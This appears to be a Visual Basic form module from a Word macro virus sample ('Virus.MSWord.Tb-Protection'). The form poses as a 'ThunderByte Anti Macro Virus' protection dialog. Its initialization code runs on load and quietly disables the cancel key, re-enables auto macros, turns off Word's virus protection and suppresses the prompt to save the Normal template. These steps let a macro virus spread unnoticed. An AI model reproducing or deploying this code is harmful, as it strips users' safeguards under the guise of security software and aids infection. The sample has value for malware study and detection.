   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} Protection
      Caption         =   "ThunderByte Anti Macro Virus"
      ClientHeight    =   3480
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   3705
      OleObjectBlob   =   "Virus.MSWord.Tb-Protection.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "Protection"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False

   Private Sub CommandButton1_Click()
   Unload Protection
   End Sub

   Private Sub Userform_initialize()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   End Sub
